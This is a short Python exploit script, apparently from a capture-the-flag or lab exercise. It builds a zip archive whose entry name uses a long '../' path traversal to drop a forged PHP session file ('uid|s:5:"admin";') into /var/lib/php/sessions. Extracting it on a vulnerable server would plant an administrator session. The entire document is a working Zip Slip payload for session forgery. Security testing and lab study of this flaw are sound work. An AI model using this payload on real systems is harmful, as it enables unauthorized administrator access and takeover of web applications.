from io import BytesIO
import zipfile

PAYLOAD = 'uid|s:5:"admin";'
SESSION_ID = '0tf30efgp62k6u1jm9lbmeckg7'
with zipfile.ZipFile("payload.zip", "w", zipfile.ZIP_DEFLATED) as zf:
    zf.writestr(f"../../../../../../../../../../../../var/lib/php/sessions/sess_{SESSION_ID}", PAYLOAD)

print("[+] Session ID:", SESSION_ID)
print("[+] Payload:", PAYLOAD)
print("[+] Payload written to payload.zip")
